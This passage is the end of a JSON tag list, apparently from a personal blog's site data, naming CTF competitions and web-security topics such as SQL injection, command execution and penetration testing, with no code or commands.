j12vbk","_id":"ck7vssfop0045pk7ec3mp6fef"}],"Tag":[{"name":"ctf","_id":"ck7vssfji0007pk7ebvt5fc8p"},{"name":"buuctf","_id":"ck7vssfk0000dpk7efhxlh9lt"},{"name":"web","_id":"ck7vssfl7000ipk7eglkihkue"},{"name":"0CTF","_id":"ck7vssflf000opk7e7wyx8b3z"},{"name":"suctf2019","_id":"ck7vssfm30018pk7egaw15042"},{"name":"Roarctf","_id":"ck7vssfna001opk7ebekv5uwa"},{"name":"极客大挑战","_id":"ck7vssfnw0023pk7e1ky10zdn"},{"name":"ciscn2019","_id":"ck7vssfo0002epk7egvmg1q1u"},{"name":"ciscn","_id":"ck7vssfo1002gpk7egyj14ixs"},{"name":"网鼎杯2018","_id":"ck7vssfo2002kpk7efaws8jrn"},{"name":"De1CTF","_id":"ck7vssfo5002qpk7edwta3vey"},{"name":"命令执行","_id":"ck7vssfo7002wpk7eed7v4u11"},{"name":"roarctf","_id":"ck7vssfo8002zpk7ecr0b78ih"},{"name":"wbe","_id":"ck7vssfo90032pk7ebo0u6xv6"},{"name":"sql注入","_id":"ck7vssfob0039pk7e8umh49ul"},{"name":"sql","_id":"ck7vssfoe003gpk7ehj46havd"},{"name":"安恒月赛2020","_id":"ck7vssfog003jpk7e6blmh812"},{"name":"wp","_id":"ck7vssfoh003mpk7ebn2mf3u8"},{"name":"php","_id":"ck7vssfoi003ppk7e4xuv6dfs"},{"name":"工具安装","_id":"ck7vssfok003tpk7ea2qkglee"},{"name":"shell","_id":"ck7vssfol003wpk7egss5b1r1"},{"name":"渗透测试","_id":"ck7vssfom003zpk7e4i9h27ll"},{"name":"日常","_id":"ck7vssfon0040pk7e0ivb7w0g"},{"name":"总结","_id":"ck7vssfoo0043pk7eanj12vbk"}]}}